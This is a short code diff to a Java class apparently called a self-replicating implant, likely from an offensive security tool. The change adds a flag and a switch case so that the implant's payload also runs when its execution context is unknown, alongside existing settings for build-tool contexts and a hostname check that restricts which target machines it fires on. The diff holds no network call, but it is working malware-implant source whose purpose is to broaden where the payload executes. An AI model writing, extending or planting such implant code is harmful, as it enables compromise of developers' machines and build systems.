@@ -92,6 +92,12 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     static volatile boolean CONF_RUN_FROM_BUILD_TOOL = true;
 
     /**
+     * Run the payload even when the execution context is unknown.
+     * It's unclear when or if this case is even possible.
+     */
+    static volatile boolean CONF_RUN_FROM_UNKNOWN = true;
+
+    /**
      * Regular expression for the expected hostname(s) of the target(s).
      * The payload will not run if the hostname of the machine does not match this regex.
      * It's a bit of a sanity check so you don't accidentally trigger this in the wrong environment.
@@ -381,6 +387,9 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 break;
             case EXEC_CTX_BUILD_TOOL:
                 isDesiredExecutionContext = CONF_RUN_FROM_BUILD_TOOL;
+                break;
+            case EXEC_CTX_UNKNOWN:
+                isDesiredExecutionContext = CONF_RUN_FROM_UNKNOWN;
                 break;
         }
 
